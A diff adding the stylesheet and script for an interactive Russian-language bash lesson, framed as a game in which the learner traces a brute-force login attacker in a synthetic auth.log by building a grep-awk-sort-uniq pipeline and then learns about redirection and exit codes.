+.ix-bash .bs-boom{position:absolute;z-index:5;right:14px;bottom:70px;padding:20px 24px;font-family:var(--f-mono);font-size:26px;line-height:1;color:var(--ink);background:var(--yel);pointer-events:none;
+  clip-path:polygon(50% 0,61% 22%,85% 6%,78% 33%,100% 38%,80% 55%,96% 78%,70% 72%,62% 100%,48% 78%,30% 98%,28% 72%,2% 82%,18% 56%,0 36%,24% 30%,14% 6%,38% 20%);animation:ix-bash-boom .9s cubic-bezier(.2,1.6,.4,1) forwards}
+.ix-bash .bs-win{display:grid;gap:16px;justify-items:start}
+.ix-bash .bs-wpost{position:relative;width:100%;max-width:440px;min-height:220px;overflow:hidden;border:3px solid #fff;background:#0b0b0b;display:flex;flex-direction:column;justify-content:center;padding:22px;filter:grayscale(1) contrast(1.1)}
+.ix-bash .bs-wpost .bs-pname{font-size:38px}
+.ix-bash .bs-wpost .bs-pline{font-size:20px;margin-top:16px}
+.ix-bash .bs-wpost .bs-pipe{height:60px}
+.ix-bash .bs-wstamp{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%) rotate(-12deg);font-family:var(--f-mono);font-size:30px;color:var(--red);background:rgba(255,255,255,.94);border:5px solid var(--red);padding:6px 14px;white-space:nowrap}
+.ix-bash .bs-win .bs-wstamp-w{position:relative;width:100%;max-width:440px}
+.ix-bash.bs-anim .bs-wstamp{animation:ix-bash-stampw .5s cubic-bezier(.2,1.6,.4,1) .2s both}
+.ix-bash .bs-wint{font-family:var(--f-mono);font-size:30px;line-height:1.1;color:var(--green)}
+.ix-bash .bs-wins{font-size:20px}
+.ix-bash .bs-wins b{font-family:var(--f-mono);font-weight:400;color:var(--yel);font-size:24px}
+.ix-bash .bs-wrule{font-family:var(--f-cap);font-size:20px;line-height:1.3;background:var(--yel);color:var(--ink);padding:14px 16px;border:3px solid #fff}
+
+/* INTERVIEW */
+.ix-bash .bs-iv{margin-top:72px;padding:28px 22px 30px;background:#fff;border:3px solid var(--ink);box-shadow:6px 6px 0 var(--ink)}
+.ix-bash .bs-ivk{font-family:var(--f-cap);font-size:14px;letter-spacing:.06em;color:var(--rdk);margin-bottom:10px}
+.ix-bash .bs-ivq{margin:0 0 20px;font-family:var(--f-cap);font-weight:400;font-size:26px;line-height:1.25}
+.ix-bash .bs-ivq code{font-size:.8em}
+.ix-bash .bs-think{display:grid;gap:4px;margin-bottom:20px;padding:14px 16px;background:var(--paper);border-left:6px solid var(--yel)}
+.ix-bash .bs-think b{font-family:var(--f-cap);font-weight:400;font-size:18px}
+.ix-bash .bs-think span{font-size:18px;line-height:1.45}
+.ix-bash .bs-iva{margin-top:24px;animation:ix-bash-up .4s ease-out}
+.ix-bash .bs-iva ol{margin:0;padding:0;list-style:none;display:grid;gap:18px;counter-reset:bsiv}
+.ix-bash .bs-iva li{position:relative;padding-left:46px;font-size:19px;line-height:1.5;counter-increment:bsiv}
+.ix-bash .bs-iva li::before{content:counter(bsiv);position:absolute;left:0;top:0;width:32px;height:32px;display:grid;place-items:center;background:var(--ink);color:var(--yel);font-family:var(--f-cap);font-size:17px}
+.ix-bash .bs-iva li b{font-weight:700}
+.ix-bash .bs-ivx{margin-top:22px;padding:14px 16px;background:var(--ink);color:#fff;font-size:19px;line-height:1.45}
+.ix-bash .bs-ivx b{color:var(--yel)}
+
+/* CHEAT SHEET */
+.ix-bash .bs-cs{margin-top:72px}
+.ix-bash .bs-cst{margin:0 0 10px;font-family:var(--f-cap);font-weight:400;font-size:30px;line-height:1.15}
+.ix-bash .bs-csl{list-style:none;margin:0;padding:0}
+.ix-bash .bs-csl li{display:flex;gap:18px;align-items:flex-start;padding:20px 0;border-bottom:2px solid rgba(20,20,20,.15)}
+.ix-bash .bs-csl li:last-child{border-bottom:0}
+.ix-bash .bs-csn{flex:0 0 64px;font-family:var(--f-mono);font-size:36px;line-height:1;color:var(--yel);-webkit-text-stroke:2px var(--ink);paint-order:stroke fill}
+.ix-bash .bs-csl div{min-width:0}
+.ix-bash .bs-csl b{display:block;font-family:var(--f-cap);font-weight:400;font-size:21px;line-height:1.2;margin-bottom:4px}
+.ix-bash .bs-csl p{font-size:18px;line-height:1.45}
+.ix-bash .bs-train{margin-top:18px;padding-top:18px;border-top:3px solid var(--ink);font-size:18px;line-height:1.5}
+
+@keyframes ix-bash-drop{from{transform:translateY(-100%)}to{transform:none}}
+@keyframes ix-bash-drop2{from{opacity:0;transform:translateY(-26px) scale(.96)}to{opacity:1;transform:none}}
+@keyframes ix-bash-shake{0%,100%{transform:none}20%{transform:translate(-6px,2px)}40%{transform:translate(5px,-3px)}60%{transform:translate(-4px,1px)}80%{transform:translate(3px,0)}}
+@keyframes ix-bash-pulse{0%,100%{box-shadow:5px 5px 0 var(--red)}50%{box-shadow:5px 5px 0 var(--red),0 0 0 8px rgba(255,214,10,.35)}}
+@keyframes ix-bash-up{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+@keyframes ix-bash-marq{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+@keyframes ix-bash-pipeglow{0%,100%{box-shadow:0 0 18px rgba(255,214,10,.5)}50%{box-shadow:0 0 40px rgba(255,214,10,.95)}}
+@keyframes ix-bash-blink{50%{opacity:0}}
+@keyframes ix-bash-pop{from{opacity:0;transform:translateY(-14px) scale(.8)}to{opacity:1;transform:none}}
+@keyframes ix-bash-flow{from{background-position:0 0}to{background-position:0 9px}}
+@keyframes ix-bash-fall{from{transform:translateY(0)}to{transform:translateY(-50%)}}
+@keyframes ix-bash-glow{0%,100%{box-shadow:0 0 0 rgba(255,214,10,0)}50%{box-shadow:0 0 24px rgba(255,214,10,.9)}}
+@keyframes ix-bash-stamp{from{opacity:0;transform:rotate(-4deg) scale(2.4)}to{opacity:1;transform:rotate(-4deg) scale(1)}}
+@keyframes ix-bash-hackin{from{transform:scale(1.6) rotate(6deg);opacity:0}to{transform:none;opacity:1}}
+@keyframes ix-bash-type{from{opacity:0}to{opacity:1}}
+@keyframes ix-bash-rewind{to{transform:translateX(-120%) skewX(30deg) scale(.6);filter:blur(4px);opacity:0}}
+@keyframes ix-bash-fade{0%,50%{opacity:1}to{opacity:0}}
+@keyframes ix-bash-boom{0%{opacity:0;transform:scale(.2) rotate(-20deg)}25%{opacity:1;transform:scale(1.15) rotate(4deg)}70%{opacity:1;transform:scale(1) rotate(-2deg)}100%{opacity:0;transform:translateY(-14px) rotate(-2deg)}}
+@keyframes ix-bash-stampw{from{opacity:0;transform:translate(-50%,-50%) rotate(-12deg) scale(3)}to{opacity:1;transform:translate(-50%,-50%) rotate(-12deg) scale(1)}}
+
+@media (max-width:760px){
+  .ix-bash .bs-mission{grid-template-columns:1fr;box-shadow:5px 5px 0 var(--yel)}
+  .ix-bash .bs-poster{border-right:0;border-bottom:3px solid var(--yel);min-height:360px;padding:60px 18px 92px}
+  .ix-bash .bs-mbody{padding:22px 16px 24px;gap:16px}
+  .ix-bash .bs-mt{font-size:40px}
+  .ix-bash .bs-moves{grid-template-columns:repeat(6,1fr)}
+  .ix-bash .bs-moves li{grid-column:span 2}
+  .ix-bash .bs-moves li:nth-child(4){grid-column:1/span 3}
+  .ix-bash .bs-moves li:nth-child(5){grid-column:4/span 3}
+  .ix-bash .bs-go{align-self:stretch}
+  .ix-bash .bs-choices,.ix-bash .bs-choices.bs-two-ch{grid-template-columns:1fr}
+  .ix-bash .bs-ch{min-height:72px}
+  .ix-bash .bs-pipe-w{grid-template-columns:minmax(0,1fr)}
+  .ix-bash .bs-ocol{position:relative;top:auto}
+  .ix-bash .bs-scrv{height:200px}
+  .ix-bash .bs-tray{grid-template-columns:repeat(2,minmax(0,1fr))}
+  .ix-bash .bs-io{grid-template-columns:1fr}
+  .ix-bash .bs-files{grid-template-columns:1fr 1fr;margin-top:4px}
+}
+@media (max-width:520px){
+  .ix-bash .bs-lvl{margin-top:40px;box-shadow:4px 4px 0 var(--ink)}
+  .ix-bash .bs-lh{padding:12px 14px}
+  .ix-bash .bs-lt{font-size:20px}
+  .ix-bash .bs-lb{padding:18px 14px 20px}
+  .ix-bash .bs-bub{font-size:21px}
+  .ix-bash .bs-tbody{padding:14px 12px 16px;font-size:15px}
+  .ix-bash .bs-cmd{font-size:17px}
+  .ix-bash .bs-cmd-big{font-size:19px}
+  .ix-bash .bs-wd code{font-size:18px}
+  .ix-bash .bs-q{font-size:20px}
+  .ix-bash .bs-two b{font-size:22px}
+  .ix-bash .bs-big{font-size:23px}
+  .ix-bash .bs-stc code{font-size:15px}
+  .ix-bash .bs-st{padding:9px 10px 10px}
+  .ix-bash .bs-scrv{font-size:12.5px;padding:10px}
+  .ix-bash .bs-scrv .bs-hl{font-size:15px;margin:0 -10px;padding:4px 10px}
+  .ix-bash .bs-blk code{font-size:15px}
+  .ix-bash .bs-line,.ix-bash .bs-line code{font-size:15px}
+  .ix-bash .bs-files{grid-template-columns:1fr}
+  .ix-bash .bs-code{font-size:13px;padding:12px}
+  .ix-bash .bs-sl,.ix-bash .bs-sl code{font-size:13.5px}
+  .ix-bash .bs-sl{padding:6px 10px;gap:8px}
+  .ix-bash .bs-magic{font-size:15px}
+  .ix-bash .bs-rule{font-size:19px}
+  .ix-bash .bs-redir li{font-size:18px}
+  .ix-bash .bs-cron{font-size:17px}
+  .ix-bash .bs-hkt{font-size:48px}
+  .ix-bash .bs-hkterm{font-size:13.5px}
+  .ix-bash .bs-bh{padding:16px 14px;gap:12px}
+  .ix-bash .bs-bface{width:68px;height:68px;font-size:38px}
+  .ix-bash .bs-bt{font-size:20px}
+  .ix-bash .bs-bbody{padding:18px 14px 22px}
+  .ix-bash .bs-vsay{font-size:22px}
+  .ix-bash .bs-wpost .bs-pname{font-size:30px}
+  .ix-bash .bs-iv{padding:22px 16px 24px}
+  .ix-bash .bs-ivq{font-size:22px}
+  .ix-bash .bs-iva li{padding-left:42px;font-size:18px}
+  .ix-bash .bs-cst{font-size:25px}
+  .ix-bash .bs-csl li{gap:14px}
+  .ix-bash .bs-csn{flex-basis:54px;font-size:30px}
+  .ix-bash .bs-hud{padding:7px 8px;gap:6px}
+  .ix-bash .bs-hud-l{font-size:10px}
+  .ix-bash .bs-pips{gap:3px}
+  .ix-bash .bs-pips span{width:20px;height:20px}
+}
+/* dock (sticky tray) */
+.ix-bash .bs-dock{position:sticky;bottom:0;z-index:20;margin:22px -20px 0;padding:12px 20px 14px;background:var(--ink);color:#fff;border-top:3px solid var(--yel)}
+.ix-bash .bs-dock.bs-done{position:relative}
+.ix-bash .bs-dock .bs-trayt{margin:0 0 8px;font-size:15px;color:var(--yel)}
+.ix-bash .bs-dock .bs-tray{margin:0}
+.ix-bash .bs-dock .bs-blk{box-shadow:3px 3px 0 #000;border-color:#000}
+.ix-bash .bs-dock .bs-blk:disabled{background:#3a3a3a;color:#888;opacity:.6}
+.ix-bash .bs-dock .bs-blk:disabled span{color:#888}
+.ix-bash .bs-dock .bs-pair{display:flex;gap:10px;margin-top:10px}
+.ix-bash .bs-btn.bs-sm{min-height:44px;font-size:15px;padding:0 12px;flex:1 1 0;background:#2a2a2a;border-color:#555;box-shadow:none}
+.ix-bash .bs-stbar{position:absolute;left:0;right:0;bottom:0;height:6px;border:0;border-top:2px solid var(--ink)}
+.ix-bash .bs-st{padding:8px 12px 13px}
+@media (max-width:760px){
+  .ix-bash .bs-stages{gap:16px}
+  .ix-bash .bs-st::before{top:-19px;height:16px}
+  .ix-bash .bs-dock .bs-tray{display:flex;overflow-x:auto;gap:10px;padding:2px 2px 6px;scroll-snap-type:x proximity;-webkit-overflow-scrolling:touch}
+  .ix-bash .bs-dock .bs-blk{flex:0 0 150px;min-height:70px;scroll-snap-align:start}
+  .ix-bash .bs-scrv{height:176px}
+}
+@media (max-width:520px){
+  .ix-bash .bs-dock{margin:18px -14px 0;padding:10px 14px 12px}
+  .ix-bash .bs-dock .bs-blk{flex-basis:138px}
+}
+@media (prefers-reduced-motion:reduce){
+  .ix-bash *,.ix-bash *::before,.ix-bash *::after{animation:none !important;transition:none !important}
+  .ix-bash .bs-boom{display:none}
+}
+</style>
+<script>
+(function(){
+  var root=document.querySelector('.ix-bash'); if(!root) return;
+  var RM=window.matchMedia&&matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if(!RM) root.classList.add('bs-anim');
+  function q(s,el){return (el||root).querySelector(s)}
+  function qa(s,el){return Array.prototype.slice.call((el||root).querySelectorAll(s))}
+  function wait(ms){return new Promise(function(r){setTimeout(r,RM?Math.min(ms,40):ms)})}
+  function esc(s){return String(s).replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]})}
+  function fmt(n){return String(n).replace(/\B(?=(\d{3})+(?!\d))/g,' ')}
+  function plural(n,f){var a=n%100,b=n%10;if(a>10&&a<20)return f[2];if(b===1)return f[0];if(b>1&&b<5)return f[1];return f[2]}
+  function lines(n){return fmt(n)+' '+plural(n,['строка','строки','строк'])}
+  var live=q('[data-live]');
+  function say(t){live.textContent='';setTimeout(function(){live.textContent=t},40)}
+  function go(el){el.scrollIntoView({behavior:RM?'auto':'smooth',block:'start'})}
+  function focusSoon(el){if(el) setTimeout(function(){el.focus({preventScroll:true})},RM?0:450)}
+
+  /* ---------- HUD ---------- */
+  var hud=q('.bs-hud'), fill=q('.bs-bar i'), barT=q('.bs-bar b'), pips=qa('.bs-pips span');
+  var S={def:0,steps:[0,0,0,0,0]};
+  function paint(){fill.style.width=S.def+'%';barT.textContent=S.def+'%';pips.forEach(function(p,i){p.classList.toggle('bs-done',!!S.steps[i])})}
+  function hit(){hud.classList.remove('bs-hit');void hud.offsetWidth;hud.classList.add('bs-hit');setTimeout(function(){hud.classList.remove('bs-hit')},700)}
+  function step(i,def){
+    if(S.steps[i]) return; S.steps[i]=1; S.def=def; paint();
+    var mv=q('[data-mv="'+(i+1)+'"]'); if(mv) mv.classList.add('bs-x');
+    q('#ix-bash-l'+(i+1)).classList.add('bs-clear');
+    var nx=q('#ix-bash-l'+(i+2)); if(nx) nx.classList.remove('bs-locked');
+  }
+  qa('[data-goto]').forEach(function(b){b.addEventListener('click',function(){
+    var t=q('#'+b.getAttribute('data-goto')); go(t);
+    focusSoon(t.classList.contains('bs-battle')?t:t.querySelector('.bs-lb button:not(:disabled)'));
+  })});
+
+  /* ---------- START ---------- */
+  var startBtn=q('[data-act="start"]');
+  startBtn.addEventListener('click',function(){
+    var l1=q('#ix-bash-l1');
+    if(!hud.classList.contains('bs-on')){
+      hud.classList.add('bs-on'); paint(); l1.classList.remove('bs-locked');
+      startBtn.textContent='Миссия начата ▼'; say('Миссия принята. Уровень 1 открыт.');
+    }
+    go(l1); focusSoon(q('[data-act="enter"]'));
+  });
+
+  /* ---------- L1: terminal vs shell ---------- */
+  var enterBtn=q('[data-act="enter"]');
+  enterBtn.addEventListener('click',function(){
+    if(enterBtn.disabled) return; enterBtn.disabled=true;
+    q('[data-t1] .bs-cur').hidden=true;
+    q('[data-t1split]').hidden=false;
+    say('bash разрезал строку на четыре слова: команда grep, флаг минус c, аргументы Failed и auth.log. Ответ: 1338.');
+    wait(900).then(function(){
+      enterBtn.textContent='⏎ Выполнено'; var p=q('[data-t1q]'); p.hidden=false;
+      focusSoon(q('.bs-ch',p));
+    });
+  });
+  var Q1={term:'Терминал — только экран и клавиатура. Поменяй терминал — строку всё равно разберёт тот же bash.',
+          grep:'grep получил уже готовые слова, без кавычек. Резал не он.'};
+  var q1=q('[data-q1]'), fb1=q('#ix-bash-l1 [data-fb]');
+  qa('.bs-ch',q1).forEach(function(b){b.addEventListener('click',function(){
+    if(b.disabled) return; var v=b.getAttribute('data-v');
+    if(v!=='bash'){b.classList.add('bs-wrong');b.disabled=true;hit();fb1.className='bs-fb bs-bad';fb1.innerHTML='<b>Мимо.</b>'+Q1[v];return}
+    qa('.bs-ch',q1).forEach(function(x){x.disabled=true}); b.classList.add('bs-right');
+    fb1.className='bs-fb bs-good'; fb1.innerHTML='<b>Да.</b>Поэтому пробелы и кавычки — это правила bash, а не grep.';
+    step(0,15); say('Уровень 1 пройден.');
+  })});
+
+  /* ---------- L2: pipeline builder ---------- */
+  function rng(a){return function(){a|=0;a=a+0x6D2B79F5|0;var t=Math.imul(a^a>>>15,1|a);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296}}
+  var LOG=(function(){
+    var R=rng(19),ev=[],i;
+    function pick(a){return a[Math.floor(R()*a.length)]}
+    function add(n,ip,st,us){for(var k=0;k<n;k++)ev.push({ip:ip,st:st,u:pick(us),k:'login'})}
+    add(1284,'203.0.113.66','Failed',['admin','root','test','sonya','teacher','guest','robot','pi']);
+    add(41,'198.51.100.200','Failed',['admin','root']);
+    add(7,'192.0.2.14','Failed',['nina.p']);add(3,'192.0.2.14','OK',['nina.p']);
+    add(3,'192.0.2.31','Failed',['sonya']);add(2,'192.0.2.31','OK',['sonya']);
+    add(2,'198.51.100.7','Failed',['artem']);add(1,'192.0.2.55','Failed',['lev']);
+    var norm=['192.0.2.31','192.0.2.14','192.0.2.40','192.0.2.41','192.0.2.77','198.51.100.7','198.51.100.12','198.51.100.33','192.0.2.55','192.0.2.90'];
+    var pages=['/raspisanie','/robots/lego','/news','/gallery','/login','/files/plan.pdf'];
+    var users=['sonya','artem','lev','nina.p','misha','vika'];
+    while(ev.length<2000){ if(R()<.3) ev.push({ip:pick(norm),st:'OK',u:pick(users),k:'login'}); else ev.push({ip:pick(norm),st:'OK',u:pick(pages),k:'page'}) }
+    for(i=ev.length-1;i>0;i--){var j=Math.floor(R()*(i+1)),t=ev[i];ev[i]=ev[j];ev[j]=t}
+    var s=3*3600,L=[];
+    function p2(n){return (n<10?'0':'')+n}
+    ev.forEach(function(e){s+=Math.floor(R()*3);
+      L.push(p2(Math.floor(s/3600))+':'+p2(Math.floor(s%3600/60))+':'+p2(s%60)+' '+e.ip+' '+e.k+' '+e.st+' '+(e.k==='login'?'user='+e.u:e.u))});
+    return L;
+  })();
+  function pad7(n){var s=String(n);while(s.length<7)s=' '+s;return s}
+  function lead(l){var m=/^\s*(-?\d+(?:\.\d+)?)/.exec(l);return m?parseFloat(m[1]):0}
+  var FN={
+    grep:function(a){return a.filter(function(l){return l.indexOf('Failed')>=0})},
+    awk:function(a){return a.map(function(l){return l.trim().split(/\s+/)[1]||''})},
+    sort:function(a){return a.slice().sort(function(x,y){return x<y?-1:x>y?1:0})},
+    uniq:function(a){var o=[],p=null,n=0;a.forEach(function(l){if(l===p)n++;else{if(p!==null)o.push(pad7(n)+' '+p);p=l;n=1}});if(p!==null)o.push(pad7(n)+' '+p);return o},
+    nr:function(a){return a.slice().sort(function(x,y){var d=lead(y)-lead(x);if(d)return d;return x<y?1:x>y?-1:0})},
+    head:function(a){return a.slice(0,5)},
+    wc:function(a){return [String(a.length)]}
+  };
+  var BLK=[
+    {id:'nr',code:'sort -nr',cap:'по числу, с большего'},
+    {id:'uniq',code:'uniq -c',cap:'склеить повторы, посчитать'},
+    {id:'grep',code:'grep "Failed"',cap:'оставить строки со словом'},
+    {id:'head',code:'head -5',cap:'первые 5 строк'},
+    {id:'awk',code:"awk '{print $2}'",cap:'взять 2-е слово из строки'},
+    {id:'wc',code:'wc -l',cap:'посчитать строки'},
+    {id:'sort',code:'sort',cap:'по порядку: одинаковые рядом'}
+  ];
+  var BY={}; BLK.forEach(function(b){BY[b.id]=b});
+  var tray=q('[data-tray]'), stagesEl=q('[data-stages]'), scr=q('[data-scr]'), scrCap=q('[data-scrcap]'),
+      cmdEl=q('[data-cmdline]'), hintEl=q('[data-hint]'), undoB=q('[data-act="undo"]'), resetB=q('[data-act="reset"]');
+  var seq=[], outs=[LOG], won=false;
+  BLK.forEach(function(b){
+    var el=document.createElement('button'); el.type='button'; el.className='bs-blk'; el.setAttribute('data-b',b.id);
+    el.innerHTML='<code>'+esc(b.code)+'</code><span>'+esc(b.cap)+'</span>';
+    el.setAttribute('aria-label','Добавить блок '+b.code+': '+b.cap);
+    el.addEventListener('click',function(){addBlk(b.id)});
+    tray.appendChild(el);
+  });
+  function pipeW(n){return n<=0?5:Math.round(7+24*Math.sqrt(n/2000))}
+  function pct(n){return n<=0?0:Math.max(n/2000*100,1.2)}
+  function stageHTML(code,n){return '<span class="bs-stc"><code>'+esc(code)+'</code></span><span class="bs-stn"><b>'+fmt(n)+'</b> '+plural(n,['строка','строки','строк'])+'</span><span class="bs-stbar"><i></i></span>'}
+  function isWin(){
+    var out=outs[outs.length-1], iu=seq.indexOf('uniq'), ig=seq.indexOf('grep');
+    if(!out.length||out.length>10||iu<0||ig<0||ig>iu) return false;
+    if(!/^\s*1284 203\.0\.113\.66$/.test(out[0])) return false;
+    for(var i=0;i<out.length;i++){ if(!/^\s*\d+ \S+$/.test(out[i])) return false; if(i&&lead(out[i])>lead(out[i-1])) return false }
+    return true;
+  }
+  function tween(el,from,to){
+    if(RM||from===to){el.textContent=fmt(to);return}
+    var t0=null,D=650;
+    function f(ts){if(!t0)t0=ts;var k=Math.min(1,(ts-t0)/D);k=1-Math.pow(1-k,3);el.textContent=fmt(Math.round(from+(to-from)*k));if(k<1)requestAnimationFrame(f)}
+    requestAnimationFrame(f);
+  }
+  function renderStages(animLast){
+    stagesEl.innerHTML='';
+    var codes=['cat auth.log'].concat(seq.map(function(id){return BY[id].code}));
+    codes.forEach(function(c,i){
+      var n=outs[i].length, li=document.createElement('li'); li.className='bs-st';
+      li.innerHTML=stageHTML(c,n);
+      if(i>0) li.style.setProperty('--win',pipeW(outs[i-1].length)+'px');
+      if(n===0) li.classList.add('bs-zero');
+      var last=i===codes.length-1;
+      if(last&&won) li.classList.add('bs-win');
+      if(last&&animLast&&i>0){
+        li.classList.add('bs-new'); li.style.setProperty('--p',pct(outs[i-1].length)+'%');
+        stagesEl.appendChild(li);
+        tween(q('.bs-stn b',li),outs[i-1].length,n);
+        void li.offsetWidth; requestAnimationFrame(function(){li.style.setProperty('--p',pct(n)+'%')});
+      } else { li.style.setProperty('--p',pct(n)+'%'); stagesEl.appendChild(li) }
+    });
+  }
+  function renderScreen(){
+    var out=outs[outs.length-1], n=out.length;
+    scrCap.textContent='вывод · '+lines(n);
+    scr.className='bs-scrv';
+    if(n===0){scr.innerHTML='<p class="bs-empty">Пусто — ни одной строки не дошло.</p>';return}
+    if(n>12){
+      var chunk=out.slice(0,36).map(esc).join('\n');
+      scr.classList.add('bs-many');
+      scr.innerHTML='<pre class="bs-fall" aria-hidden="true">'+chunk+'\n'+chunk+'</pre><span class="bs-more">поток: '+lines(n)+'</span>';
+      return;
+    }
+    var h=out.map(function(l,i){return i===0&&won?'<span class="bs-hl">'+esc(l)+'  ← ЭТО ОН</span>':esc(l)}).join('\n');
+    if(won) scr.classList.add('bs-won');
+    scr.innerHTML='<pre>'+h+'</pre>'+(won?'<span class="bs-found">НАЙДЕН</span>':'');
+  }
+  function hintText(){
+    if(won) return 'Вот он! Первая строка — самый частый IP. Семь команд за секунду сделали то, на что глазами ушёл бы час.';
+    if(!seq.length) return 'Начни с фильтра: нам нужны только строки со словом Failed.';
+    var last=seq[seq.length-1], out=outs[outs.length-1], n=out.length, iu=seq.indexOf('uniq'), ia=seq.indexOf('awk'), ig=seq.indexOf('grep');
+    if(n===0){
+      if(ia>=0&&ig>ia) return 'Поток пуст! awk оставил одни IP — слова Failed в строках больше нет, и grep нечего искать. Порядок важен: убери лишнее ⌫.';
+      return 'Поток пуст. Убери последний блок ⌫.';
+    }
+    if(last==='wc') return 'wc -l посчитал строки: '+out[0]+'. Это «сколько», а нам нужно «кто». Убери его ⌫.';
+    if(iu>=0){
+      var before=seq.slice(0,iu);
+      if(before.indexOf('sort')<0&&before.indexOf('nr')<0) return 'Смотри: один и тот же IP встречается много раз, а счётчики маленькие. uniq -c склеивает только СОСЕДНИЕ одинаковые строки. Перед ним нужен sort ⌫.';
+      if(ia<0||ia>iu) return 'Каждая строка лога уникальна — в ней есть время. Сначала вырежи из строк один IP, потом считай ⌫.';
+      if(ig<0||ig>iu) return 'Ты посчитал все строки лога, а не только неудачные входы. Нужен grep "Failed" в начале ⌫.';
+    }
+    if(ig<0&&ia>=0) return 'Ты взял IP из всех строк, а нам нужны только неудачные входы. Начни с grep "Failed" ⌫.';
+    if(last==='grep') return 'Осталось '+lines(n)+' с Failed. Теперь вырежи из каждой только IP.';
+    if(last==='awk') return 'В трубе одни IP. Одинаковые нужно поставить рядом.';
+    if(last==='sort') return iu>=0?'Это сортировка по алфавиту, а не по числу. Нужен блок для чисел ⌫.':'Одинаковые IP теперь стоят рядом. Посчитай их.';
+    if(last==='uniq') return lines(n).replace(/^./,function(c){return c.toUpperCase()})+' — по одной на адрес, со счётчиком. Подними самый частый наверх.';
+    if(last==='nr') return 'Отсортировал по числам. Но наверху не тот, кто нужен — проверь порядок блоков ⌫.';
+    if(last==='head') return 'head оставил первые строки. Но это ещё не топ по числу попыток ⌫.';
+    return 'Продолжай собирать трубу.';
+  }
+  function cmdText(){
+    cmdEl.innerHTML=esc('cat auth.log')+seq.map(function(id){return ' <span class="bs-pp">|</span> '+esc(BY[id].code)}).join('');
+  }
+  function syncTray(){
+    qa('.bs-blk',tray).forEach(function(b){b.disabled=seq.indexOf(b.getAttribute('data-b'))>=0});
+    undoB.disabled=!seq.length; resetB.disabled=!seq.length;
+  }
+  function renderAll(anim){
+    won=isWin(); renderStages(anim); renderScreen(); cmdText(); syncTray(); hintEl.textContent=hintText();
+  }
+  function addBlk(id){
+    if(seq.indexOf(id)>=0) return;
+    seq.push(id); outs.push(FN[id](outs[outs.length-1]));
+    renderAll(true);
+    var scrBox=q(".bs-ocol"),r=scrBox.getBoundingClientRect(),dk=q('[data-dock]').getBoundingClientRect();
+    var dy=r.bottom>dk.top-8?r.bottom-dk.top+12:(r.top<50?r.top-60:0); if(dy) window.scrollBy({top:dy,behavior:RM?'auto':'smooth'});
+    var n=outs[outs.length-1].length;
+    say(BY[id].code+': '+lines(n)+'. '+hintText());
+    if(won){
+      step(1,45); q('[data-dock]').classList.add('bs-done');
+    } else {
+      var f=q('.bs-blk:not(:disabled)',tray); if(document.activeElement&&document.activeElement.disabled&&f) f.focus({preventScroll:true});
+    }
+  }
+  undoB.addEventListener('click',function(){if(!seq.length)return;seq.pop();outs.pop();renderAll(false);say('Блок убран. '+hintText());if(undoB.disabled)focusSoon(q('.bs-blk',tray))});
+  resetB.addEventListener('click',function(){seq=[];outs=[LOG];renderAll(false);say('Труба пуста.');focusSoon(q('.bs-blk',tray))});
+  renderAll(false);
+
+  /* ---------- L3: streams ---------- */
+  var TOP5=FN.head(FN.nr(FN.uniq(FN.sort(FN.awk(FN.grep(LOG))))));
+  var ioScr=q('[data-io-scr]'), ioCap=q('[data-io-cap]'), ioBtn=q('[data-act="io"]'), q3=q('[data-q3]'), fb3=q('#ix-bash-l3 [data-fb]');
+  var rep=q('[data-file="report"]'), err=q('[data-file="errors"]'), repB=q('[data-fbody]',rep), errB=q('[data-fbody]',err);
+  var PIPE='grep "Failed" auth.log | … | head -5';
+  var ERRL='grep: auth.log.1: No such file or directory';
+  var io=0;
+  function cmdP(c){return '<p><span class="bs-ps">$</span> '+esc(c)+'</p>'}
+  function flash(f,cls){f.classList.remove('bs-fl','bs-wipe');void f.offsetWidth;f.classList.add(cls||'bs-fl')}
+  ioScr.innerHTML=cmdP(PIPE)+'<p>'+TOP5.map(esc).join('\n')+'</p>';
+  ioCap.innerHTML='Сейчас результат льётся на экран. Закроешь терминал — улика пропадёт.';
+  ioBtn.addEventListener('click',function(){
+    if(io===0){
+      io=1; ioScr.innerHTML=cmdP(PIPE+' > report.txt')+'<p class="bs-dim">(на экране пусто — всё ушло в файл)</p>';
+      repB.innerHTML='<i>запуск 1</i>\n'+esc(TOP5.join('\n')); flash(rep);
+      ioCap.innerHTML='<b>&gt;</b> направил обычный вывод в файл. <b>Утром ты запустишь это снова.</b> Как дописать новый результат, не стерев вчерашний?';
+      ioBtn.hidden=true; q3.hidden=false; focusSoon(q('.bs-ch',q3)); say('Вывод записан в report.txt. Вопрос: как дописать, не стерев?');
+    } else if(io===2){
+      io=3; ioScr.innerHTML=cmdP('grep -c "Failed" auth.log auth.log.1')+'<p>auth.log:1338</p><p class="bs-err">'+ERRL+'</p>';
+      ioCap.innerHTML='Вчерашнего лога <b>auth.log.1</b> нет. Ошибка смешалась с результатом на экране.';
+      ioBtn.textContent='Увести ошибки: 2> errors.txt ▶'; say('Ошибка смешалась с результатом.');
+    } else if(io===3){
+      io=4; ioScr.innerHTML=cmdP('grep -c "Failed" auth.log auth.log.1 2> errors.txt')+'<p>auth.log:1338</p>';
+      errB.textContent=ERRL; flash(err);
+      ioCap.innerHTML='<b>2&gt;</b> — это поток номер 2, ошибки. Он ушёл в файл, на экране остался только результат.';
+      ioBtn.textContent='Узнать код выхода: echo $? ▶'; say('Ошибки ушли в errors.txt.');
+    } else if(io===4){
+      io=5; ioScr.innerHTML+=cmdP('echo $?')+'<p class="bs-err">2</p>';
+      ioCap.innerHTML='<b>2</b> — по ходу была ошибка. 0 значит «всё хорошо», 1 — grep ничего не нашёл.';
+      ioBtn.hidden=true; step(2,60); say('Код выхода 2: была ошибка. Уровень 3 пройден.');
+    }
+  });
+  qa('.bs-ch',q3).forEach(function(b){b.addEventListener('click',function(){
+    if(b.disabled) return;
+    if(b.getAttribute('data-v')==='gt'){
+      b.classList.add('bs-wrong'); b.disabled=true; hit();
+      repB.innerHTML='<i>запуск 2</i>\n'+esc(TOP5.join('\n')); flash(rep,'bs-wipe');
+      fb3.className='bs-fb bs-bad'; fb3.innerHTML='<b>Стёрто!</b>Одна стрелка сначала опустошает файл. Вчерашней улики больше нет. Попробуй две.';
+      return;
+    }
